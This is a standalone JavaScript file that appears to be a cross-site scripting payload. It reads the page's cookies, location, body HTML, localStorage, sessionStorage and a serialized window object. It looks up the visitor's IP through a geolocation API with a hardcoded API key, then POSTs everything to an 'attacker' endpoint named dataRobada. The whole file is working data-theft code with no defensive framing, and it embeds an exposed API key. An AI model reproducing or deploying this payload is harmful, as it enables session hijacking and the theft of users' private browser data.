
let cookies = document.cookie;
let lc = document.location;
let url = document.url;
let bodyIn = document.body.innerHTML;
let bodyOut = document.body.outerHTML;
let bodyAdj = document.body.insertAdjacentHTML;
let localStorageData = localStorage
let sessionStorageData = sessionStorage

let apiKey = 'b4edf0a39eba42e38c22883bc02b43a8';
const handleIpData =async () => {
    let kk = await fetch('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey)
    return kk
}


  

JSON.stringifyOnce = function(obj, replacer, indent){
    var printedObjects = [];
    var printedObjectKeys = [];

    function printOnceReplacer(key, value){
        if ( printedObjects.length > 2000){ // browsers will not print more than 20K, I don't see the point to allow 2K.. algorithm will not be fast anyway if we have too many objects
        return 'object too long';
        }
        var printedObjIndex = false;
        printedObjects.forEach(function(obj, index){
            if(obj===value){
                printedObjIndex = index;
            }
        });

        if ( key == ''){ //root element
             printedObjects.push(obj);
            printedObjectKeys.push("root");
             return value;
        }

        else if(printedObjIndex+"" != "false" && typeof(value)=="object"){
            if ( printedObjectKeys[printedObjIndex] == "root"){
                return "(pointer to root)";
            }else{
                return "(see " + ((!!value && !!value.constructor) ? value.constructor.name.toLowerCase()  : typeof(value)) + " with key " + printedObjectKeys[printedObjIndex] + ")";
            }
        }else{

            var qualifiedKey = key || "(empty key)";
            printedObjects.push(value);
            printedObjectKeys.push(qualifiedKey);
            if(replacer){
                return replacer(key, value);
            }else{
                return value;
            }
        }
    }
    return JSON.stringify(obj, printOnceReplacer, indent);
};
let a = JSON.stringifyOnce(window)

handleIpData().then(x=>{

    
    let objectToAttacker= {
        window: a,
        cookies,
        lc,
        url,
        bodyIn,
        bodyOut,
        bodyAdj,
        localStorageData,
        sessionStorageData,
        urlTrack : x["url"]
    }
    urlAtacante = 'http://localhost:3000/dataRobada'
    var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

var raw = JSON.stringify({
    objectToAttacker
});

var requestOptions = {
  method: 'POST',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
};

fetch("http://localhost:3000/dataRobada", requestOptions)
  .then(response => response.text())
  .then(result => console.log(result))
  .catch(error => console.log('error', error));
})

